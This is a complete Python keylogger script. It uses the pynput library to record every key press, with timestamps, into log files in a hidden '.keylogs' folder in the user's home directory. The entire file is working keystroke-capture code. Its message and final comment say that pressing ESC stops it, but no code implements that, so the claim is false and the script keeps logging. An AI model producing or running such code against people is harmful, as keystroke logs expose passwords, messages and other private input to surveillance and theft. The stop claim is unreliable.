"""Keylogger using python"""

from pynput import keyboard
import logging
import os
from datetime import datetime

# Define log file path in user's home directory
log_dir = os.path.expanduser("~/.keylogs")
os.makedirs(log_dir, exist_ok=True)
log_file_path = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

#Configure logging format with timestamp
logging.basicConfig(
    filename=log_file_path,
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

#Define key press handler
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handles special keys like shift, ctrl, etc.
        logging.info(f"Special key pressed: {key}")

#Use listener with error handling
try:
    with keyboard.Listener(on_press=on_press) as listener:
        print("Keylogger is active. Press ESC to stop.")
        listener.join()
except Exception as e:
    logging.error(f"An error occurred: {e}")
    print(f"Error: {e}")
#Graceful exit on ESC key
